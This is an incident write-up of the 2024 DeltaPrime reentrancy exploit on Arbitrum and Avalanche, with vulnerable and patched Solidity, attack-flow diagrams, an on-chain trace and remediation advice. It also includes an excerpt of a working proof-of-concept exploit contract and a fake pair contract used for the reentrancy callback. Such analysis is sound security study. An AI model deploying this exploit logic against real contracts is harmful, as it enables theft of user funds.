# DeltaPrime — Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-11 |
| **Protocol** | DeltaPrime |
| **Chain** | Arbitrum (+ Avalanche simultaneous losses) |
| **Loss** | $4,750,000 (Arbitrum $753K + Avalanche $4.1M) |
| **Attacker** | [0xb878...c567](https://arbiscan.io/address/0xb87881637b5c8e6885c51ab7d895e53fa7d7c567) |
| **Attack Contract** | [0x0b2b...bfE](https://arbiscan.io/address/0x0b2bcf06f740c322bc7276b6b90de08812ce9bfe) |
| **Attack Tx** | [0x6a2f...8f7f](https://arbiscan.io/tx/0x6a2f989b5493b52ffc078d0a59a3bf9727d134b403aa6e0bf309fd513a728f7f) |
| **Vulnerable Contract** | [0x62cf...0c6c](https://arbiscan.io/address/0x62cf82fb0484af382714cd09296260edc1dc0c6c) |
| **Root Cause** | Reentrancy attack via arbitrary external contract callback in `claimReward()` combined with unvalidated parameters in `swapDebtParaSwap()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/DeltaPrime_exp.sol) |

---

## 1. Vulnerability Overview

DeltaPrime is a decentralized lending/leverage protocol operating on Arbitrum and Avalanche. On November 11, 2024, an attacker chained two independent vulnerabilities to steal approximately $4.75M. This was the second security incident at the protocol, occurring just two months after a private key compromise in September of the same year ($6M loss).

**Two core vulnerabilities:**

1. **`claimReward()` arbitrary external call (reentrancy vector)**: With no input validation whatsoever on the `pair` parameter, an attacker could inject a malicious contract address to trigger a callback. Within that callback, additional function calls could be made before the protocol's internal state was updated, enabling a reentrancy attack.

2. **`swapDebtParaSwap()` unvalidated parameters**: Even when `_repayAmount` was set to `0` and `_borrowAmount` was set excessively high, the protocol did not re-verify collateral health, allowing the attacker to borrow far more assets than the actual collateral supported.

By combining these two vulnerabilities, the attacker used 2,859 WETH obtained via a Balancer flash loan as collateral to siphon an additional ~66.6 ETH worth of assets.

---

## 2. Vulnerable Code Analysis

### 2.1 `claimReward()` — Arbitrary External Contract Allowed (Core Reentrancy Vulnerability)

```solidity
// ❌ Vulnerable code — no validation of the pair parameter
function claimReward(address pair, uint256[] calldata ids) external {
    // Does not verify whether the pair address is whitelisted
    // Attacker can pass any arbitrary malicious contract as pair
    ILBPair(pair).claim(msg.sender, ids);   // ← Point where malicious callback occurs

    // Internal state updated only after callback completes → reentrancy possible
    _updateBalances();
}
```

```solidity
// ✅ Fixed code — whitelist validation + CEI pattern applied
mapping(address => bool) public approvedPairs;  // Admin-approved pair address list

function claimReward(address pair, uint256[] calldata ids) external nonReentrant {
    // 1. Check: verify the pair is approved
    require(approvedPairs[pair], "Pair not whitelisted");

    // 2. Effect: update internal state first
    _updateBalances();

    // 3. Interaction: external call last
    ILBPair(pair).claim(msg.sender, ids);
}
```

**Issue**: Violates the CEI (Checks-Effects-Interactions) pattern, lacks a `nonReentrant` modifier, and does not restrict external addresses via a whitelist — allowing arbitrary callbacks to execute before internal state is updated.

---

### 2.2 `swapDebtParaSwap()` — Unvalidated Borrow Amount

```solidity
// ❌ Vulnerable code — _repayAmount passed to swap adapter without validation
function swapDebtParaSwap(
    bytes32 _fromAsset,
    bytes32 _toAsset,
    uint256 _repayAmount,   // ← no validation even when set to 0
    uint256 _borrowAmount,  // ← can be set above collateral value
    bytes4 selector,
    bytes memory data
) external {
    // Borrow of _borrowAmount executes even if _repayAmount is 0
    // No isSolvent check after borrowing
    _executeSwap(selector, data, _repayAmount, _borrowAmount);
}
```

```solidity
// ✅ Fixed code — parameter validation + post-execution solvency check
function swapDebtParaSwap(
    bytes32 _fromAsset,
    bytes32 _toAsset,
    uint256 _repayAmount,
    uint256 _borrowAmount,
    bytes4 selector,
    bytes memory data
) external nonReentrant {
    // 1. Parameter validation: repay amount must not be 0
    require(_repayAmount > 0, "repayAmount must be > 0");
    require(_borrowAmount <= _repayAmount * MAX_BORROW_RATIO / 1e18, "borrowAmount exceeds limit");

    _executeSwap(selector, data, _repayAmount, _borrowAmount);

    // 2. Post-execution validation: re-verify solvency after swap
    require(isSolvent(), "Position insolvent after swap");
}
```

**Issue**: Setting `_repayAmount = 0` effectively enables uncollateralized borrowing, and a position solvency check after swap completion is missing.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker pre-deploys the attack contract (`DeltaPrimeExp`) and a malicious pair contract (`FakePairContract`)
- `FakePairContract` disguises itself as a TraderJoe V2 LB Pair interface (`getLBHooksParameters`, `claim`, `getRewardToken`)
- Designed so that within its `claim()` function, it calls back into the attack contract's `convertETH()` function

### 3.2 Execution Phase

```
1. [Flash Loan Request]
   Attacker EOA
       │
       ▼
   DeltaPrimeExp.testExploit()
       │  Balancer.flashLoan(full WETH amount)
       ▼
   Balancer Vault ──────── 2,859 WETH ──────────▶ DeltaPrimeExp
```

```
2. [Collateral Deposit + Position Creation]

   DeltaPrimeExp
       │  WETH.withdraw() → convert to ETH
       │  SmartLoansFactoryTUP.createLoan() → create SmartLoan
       │  SmartLoan.call{value: ETH}("") → deposit ETH as collateral
       ▼
   SmartLoan (position contract)
       └── ETH balance: ~2,859 ETH (collateral)
```

```
3. [Exploit Vulnerability 1: unvalidated borrow via swapDebtParaSwap]

   DeltaPrimeExp
       │  swapDebtParaSwap(
       │    _fromAsset = USDC,
       │    _toAsset   = ETH,
       │    _repayAmount = 0,        ← ❌ no validation
       │    _borrowAmount = 66.6 ETH ← borrowed without actual repayment
       │  )
       ▼
   SmartLoan
       │  Calls ParaSwap adapter → WETH.withdraw(66.6 ETH)
       │  Borrowed ETH added to SmartLoan balance
       │  No solvency re-check ❌
       ▼
   SmartLoan ETH balance: ~2,859 + 66.6 ETH
```

```
4. [Exploit Vulnerability 2: claimReward reentrancy]

   DeltaPrimeExp
       │  claimReward(
       │    pair = FakePairContract,  ← ❌ no whitelist check
       │    ids  = [0]
       │  )
       ▼
   SmartLoan.claimReward()
       │  Calls ILBPair(FakePairContract).claim()
       │
       ├──▶ FakePairContract.claim()
       │         │
       │         │  Calls back DeltaPrimeExp.convertETH() ← reentrancy occurs
       │         ▼
       │    DeltaPrimeExp.convertETH()
       │         │  SmartLoan.wrapNativeToken(SmartLoan.balance)
       │         │  → Converts all ETH in SmartLoan to WETH
       │         │  → Asset conversion complete before internal state updated
       │         ▼
       │    SmartLoan ETH→WETH conversion: ~2,925 WETH
       │
       ▼
   SmartLoan.claimReward() continues execution
       │  getRewardToken() → returns WETH
       │  Protocol recognizes ~2,925 WETH as "reward"
       │  Pays out WETH to DeltaPrimeExp
       ▼
   DeltaPrimeExp WETH balance: ~2,925 WETH
```

```
5. [Flash Loan Repayment and Profit Realization]

   DeltaPrimeExp
       │  WETH.transfer(Balancer, 2,859 WETH)  ← flash loan repaid
       ▼
   Net profit: ~66 WETH (~$247,000, Arbitrum only)
   (Same pattern exploited on Avalanche for additional $4.1M)
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Arbitrum losses | ~$753,000 |
| Avalanche losses | ~$4,100,000 |
| **Total loss** | **~$4,750,000** |
| Attacker profit (Arbitrum) | ~66 WETH (~$247K) |

After the attack, the stolen funds were not immediately laundered — instead they were redeployed into DeFi protocols such as Stargate (USDC $600K) and LFG to generate yield.

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// Core attack logic excerpt — step-by-step comments

contract DeltaPrimeExp is Test {
    // ...

    function receiveFlashLoan(...) external {
        // [Step 1] Convert WETH → ETH and deposit as collateral into SmartLoan
        WETH.withdraw(WETH.balanceOf(address(this)));
        address(SmartLoan).call{value: address(this).balance}("");

        // [Step 2] Exploit swapDebtParaSwap vulnerability
        // _repayAmount=0, _borrowAmount=66.6 ETH → borrow executes without validation
        bytes memory swapDebtParaSwapData = abi.encodePacked(
            abi.encodeCall(
                ISmartLoan.swapDebtParaSwap,
                (_fromAsset, _toAsset, _repayAmount, _borrowAmount, selector, data)
            ),
            priceData  // Append external price data (bypasses validation)
        );
        address(SmartLoan).call(swapDebtParaSwapData);

        // [Step 3] Inject FakePairContract into claimReward → trigger reentrancy
        bytes memory claimRewardData = abi.encodePacked(
            abi.encodeCall(ISmartLoan.claimReward, (address(fakePairContract), ids)),
            priceData
        );
        address(SmartLoan).call(claimRewardData);
        // → FakePairContract.claim() called
        // → convertETH() callback (reentrancy)
        // → All ETH in SmartLoan converted to WETH and paid out as reward

        // [Step 4] Repay flash loan
        WETH.transfer(address(Balancer), flashLoanAmount);
    }

    // [Reentrancy callback] Function called by FakePairContract.claim()
    function convertETH() external {
        // Convert entire ETH balance of SmartLoan to WETH
        // At this point, internal state update in claimReward() has not yet occurred
        address(SmartLoan).call(
            abi.encodePacked(
                abi.encodeCall(ISmartLoan.wrapNativeToken, (address(SmartLoan).balance)),
                priceData
            )
        );
    }
}

// Reentrancy vehicle: disguised as TraderJoe V2 LB Pair interface
contract FakePairContract {
    function claim(address user, uint256[] calldata ids) external {
        // ← This call occurs mid-execution of claimReward() (reentrancy)
        attackContract.call(
            abi.encodeWithSelector(DeltaPrimeExp.convertETH.selector, "")
        );
    }

    function getRewardToken() external returns (address) {
        return WETH;  // Returns WETH as reward token to induce WETH withdrawal
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | `claimReward()` arbitrary external callback (reentrancy) | CRITICAL | CWE-841 / CWE-362 | `01_reentrancy.md` |
| V-02 | `swapDebtParaSwap()` unvalidated parameters | CRITICAL | CWE-20 | `11_logic_error.md` |
| V-03 | Trust in external price data (price data manipulation) | HIGH | CWE-345 | `04_oracle_manipulation.md` |

### V-01: `claimReward()` Arbitrary External Callback Reentrancy

- **Description**: The `claimReward(address pair, ...)` function makes an external call to the `pair` parameter without whitelist validation. When an attacker injects a malicious contract as `pair`, the `claim()` callback enables reentrancy before the protocol's state is updated.
- **Impact**: The attacker calls `wrapNativeToken()` before internal balances are updated, converting all ETH in the SmartLoan to WETH and claiming it as a reward — effectively stealing the collateral.
- **Attack conditions**: (1) Attacker holds a SmartLoan position, (2) malicious `pair` contract is pre-deployed, (3) attacker has permission to call `claimReward()`.

### V-02: `swapDebtParaSwap()` Unvalidated Parameters

- **Description**: Setting `_repayAmount = 0` still executes a borrow of `_borrowAmount` worth of assets, and a collateral solvency (`isSolvent`) check after swap completion is absent.
- **Impact**: The attacker borrows a large amount of assets without actual repayment, inflating ETH within the position contract. This amplifies the scale of theft in the subsequent reentrancy attack.
- **Attack conditions**: Permission to call `swapDebtParaSwap()` (possible as the SmartLoan owner).

### V-03: Trust in External Price Data

- **Description**: In the PoC code, price data from a `DelatPrimePriceData.txt` file is appended via `abi.encodePacked()` to every function call. The protocol's architecture accepts externally signed price data instead of on-chain oracles, allowing an attacker to submit prices favorable to themselves.
- **Impact**: Collateral value can be overestimated, enabling position solvency checks to be bypassed.
- **Attack conditions**: The protocol does not verify signatures on external price data, or additional checks such as expiry time are insufficiently enforced.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// 1. claimReward() — apply whitelist + nonReentrant + CEI pattern
mapping(address => bool) public approvedLBPairs;

modifier onlyApprovedPair(address pair) {
    require(approvedLBPairs[pair], "Pair not in whitelist");
    _;
}

function claimReward(
    address pair,
    uint256[] calldata ids
) external nonReentrant onlyApprovedPair(pair) {
    // CEI: Effect first, Interaction last
    _updateInternalState();                    // Update state first
    ILBPair(pair).claim(msg.sender, ids);      // External call last
}

// 2. swapDebtParaSwap() — parameter validation + post-execution solvency check
function swapDebtParaSwap(
    bytes32 _fromAsset,
    bytes32 _toAsset,
    uint256 _repayAmount,
    uint256 _borrowAmount,
    bytes4 selector,
    bytes memory data
) external nonReentrant {
    require(_repayAmount > 0, "repayAmount must be > 0");           // ✅ block zero repayment
    require(_borrowAmount <= getMaxBorrowable(), "Exceeds limit");   // ✅ block over-borrowing

    _executeSwap(selector, data, _repayAmount, _borrowAmount);

    require(isSolvent(), "Insolvent after swap");                    // ✅ post-execution solvency check
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Reentrancy | Apply `ReentrancyGuard` to all functions with external interactions; enforce CEI pattern universally |
| V-02 Unvalidated parameters | Validate all externally supplied parameters + double-check position solvency before and after swaps |
| V-03 External price data | Migrate to decentralized on-chain oracles such as Chainlink; strengthen price signature expiry and freshness checks |
| General architecture | When using proxy patterns, protect upgrade authority with timelock + multisig |
| Monitoring | Set up real-time detection alerts for anomalous flash loan + claim call combination patterns |

---

## 7. Lessons Learned

1. **The CEI pattern is mandatory, not optional**: Internal state must be updated before any external call. The "update state after claim" pattern is the classic breeding ground for reentrancy.

2. **Always whitelist external address parameters**: Using an external contract reference parameter such as `address pair` without validation is effectively equivalent to arbitrary code execution.

3. **Chained vulnerabilities are more dangerous**: V-01 and V-02 are individually dangerous, but combined they create a synergy of collateral inflation → reentrancy theft. Audits must analyze the potential for vulnerabilities to chain together.

4. **Always perform a solvency re-check after swaps and borrows**: Every function that modifies collateral state must execute `isSolvent()` or an equivalent check upon completion.

5. **A second incident is a louder warning**: A second hack at the same protocol signals a systemic failure of the entire security process. A full re-audit and code freeze are necessary after the first incident.

6. **Replace external price data with on-chain oracles**: Signature-based off-chain price data carries high risks of replay and forgery. Verified on-chain oracles such as Chainlink and Pyth should be used instead.

---

## 8. On-Chain Verification

> Cross-verification against on-chain transactions (based on public block explorers)

### 8.1 PoC vs. On-Chain Amount Comparison (Arbitrum)

| Item | PoC Value | On-Chain Actual | Notes |
|------|--------|-------------|------|
| Flash loan size | Full Balancer WETH | ~2,859 WETH | As of block 273,278,741 |
| Additional borrow (`_borrowAmount`) | 66,619,545,304,650,988,218 wei | ~66.6 ETH | `swapDebtParaSwap` parameter |
| `_repayAmount` | 0 | 0 | Unvalidated zero repayment |
| Total Arbitrum losses | — | ~$753,000 | ETH/ARB pools |
| Total Avalanche losses | — | ~$4,100,000 | AVAX/WETH.e/BTC.b pools |

### 8.2 On-Chain Key Event Sequence (Arbitrum Tx)

```
Tx: 0x6a2f989b5493b52ffc078d0a59a3bf9727d134b403aa6e0bf309fd513a728f7f
Block: 273,278,741

1. FlashLoan(receiver=DeltaPrimeExp, tokens=[WETH], amounts=[2859 WETH])
2. Transfer(from=Balancer, to=DeltaPrimeExp, value=2859 WETH)
3. Withdrawal(WETH→ETH, amount=2859 ETH)   — WETH.withdraw()
4. Transfer(ETH, from=DeltaPrimeExp, to=SmartLoan)  — collateral deposit
5. Call: swapDebtParaSwap(_repayAmount=0, _borrowAmount=66.6 ETH)
6. Call: claimReward(pair=FakePairContract, ids=[0])
7.   └─▶ FakePairContract.claim() [reentrancy]
8.       └─▶ DeltaPrimeExp.convertETH() [reentrancy callback]
9.           └─▶ SmartLoan.wrapNativeToken(~2925 ETH→WETH)
10. Transfer(SmartLoan→DeltaPrimeExp, ~2925 WETH)  — reward payout
11. Transfer(DeltaPrimeExp→Balancer, 2859 WETH)    — flash loan repaid
12. Net profit: ~66 WETH claimed by attacker
```

### 8.3 Pre-Condition Verification

| Condition | Status |
|------|------|
| SmartLoan position pre-created | Created directly by the attack contract via `createLoan()` call |
| `FakePairContract` deployed | Deployed early in the same transaction |
| Sufficient Balancer WETH balance | Adequate WETH liquidity confirmed at block 273,278,741 |
| Attacker ETH not required | Attack executable from zero capital using flash loan alone |

---

*References*
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/DeltaPrime_exp.sol)
- [Halborn Analysis](https://www.halborn.com/blog/post/explained-the-deltaprime-hack-november-2024)
- [CertiK Analysis](https://www.certik.com/resources/blog/deltaprime-incident-analysis)
- [SolidityScan Analysis](https://blog.solidityscan.com/deltaprime-hack-analysis-44edb9b22567)
- [Verichains Analysis](https://blog.verichains.io/p/deltaprime-exploit-analysis)
- [Medium/Coinmonks Analysis](https://medium.com/coinmonks/decoding-deltaprimedefis-4-75-million-exploit-838c46e4daf8)